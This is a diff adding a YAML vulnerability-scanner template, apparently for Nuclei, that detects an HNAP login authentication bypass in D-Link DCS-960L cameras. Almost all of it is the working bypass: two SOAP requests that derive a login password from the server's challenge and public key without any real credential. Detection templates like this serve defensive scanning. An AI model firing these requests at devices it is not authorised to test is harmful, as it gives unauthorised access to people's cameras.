@@ -1,0 +1,77 @@
+id: dlink-dcs960l-auth-bypass
+info:
+  name: D-Link DCS-960L HNAP LoginPassword Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    D-Link DCS-960L processes the HNAP login request incorrectly, allowing attackers to construct a special login request to bypass authentication.
+  tags: permission-bypass, authentication
+
+variables:
+  username: "CataLpa"
+
+http:
+  - raw:
+      - |
+        POST /HNAP1/ HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://purenetworks.com/HNAP1/Login"
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <Login xmlns="http://purenetworks.com/HNAP1/">
+              <Action>request</Action>
+              <Username>{{username}}</Username>
+              <LoginPassword></LoginPassword>
+              <Captcha></Captcha>
+            </Login>
+          </soap:Body>
+        </soap:Envelope>
+
+    extractors:
+      - type: regex
+        name: challenge
+        internal: true
+        group: 1
+        regex:
+          - '<Challenge>(.*?)</Challenge>'
+      - type: regex
+        name: cookie
+        internal: true
+        group: 1
+        regex:
+          - '<Cookie>(.*?)</Cookie>'
+      - type: regex
+        name: public_key
+        internal: true
+        group: 1
+        regex:
+          - '<PublicKey>(.*?)</PublicKey>'
+
+  - raw:
+      - |
+        POST /HNAP1/ HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: "http://purenetworks.com/HNAP1/Login"
+        Content-Type: text/xml; charset=utf-8
+        Cookie: uid={{cookie}};
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <Login xmlns="http://purenetworks.com/HNAP1/">
+              <Action>login</Action>
+              <Username>{{username}}</Username>
+              <LoginPassword>{{generate_hmac(generate_hmac(public_key, challenge), challenge)}}</LoginPassword>
+            </Login>
+          </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: word
+        words:
+          - "<LoginResult>success</LoginResult>"
+        part: body
+    matchers-condition: and
